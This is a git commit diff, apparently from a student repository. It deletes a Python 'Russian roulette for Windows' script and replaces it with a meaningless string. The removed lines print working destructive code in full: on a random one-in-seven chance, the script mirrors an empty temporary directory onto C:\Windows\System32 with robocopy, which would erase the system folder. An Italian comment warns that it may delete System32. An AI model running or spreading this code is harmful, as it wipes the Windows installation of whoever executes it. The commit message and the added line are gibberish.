33c15e5334a522dfda19308ebf88a57b52eccb7e
Salvatore Ciaramidaro <salvatore.ciaramidaro@studenti.isissgobetti.it>
2023-03-22 10:58:33 +0100

    8u7u7

--- roulotterussaperwindows.py
+++ roulotterussaperwindows.py
@@ -1,10 +1,1 @@
-#Usalo con cautela questo programma potrebbe cancellarti System32 se la variabile prende valore 1 
-import random
-import subprocess
-import tempfile
-
-if random.randint(0, 6) == 1:
-    with tempfile.TemporaryDirectory() as empty:
-        subprocess.run(
-            ["robocopy", "/R:0", "/W:0", "/mir", empty, "C:\Windows\System32"]
-        )
+fgvtgfv
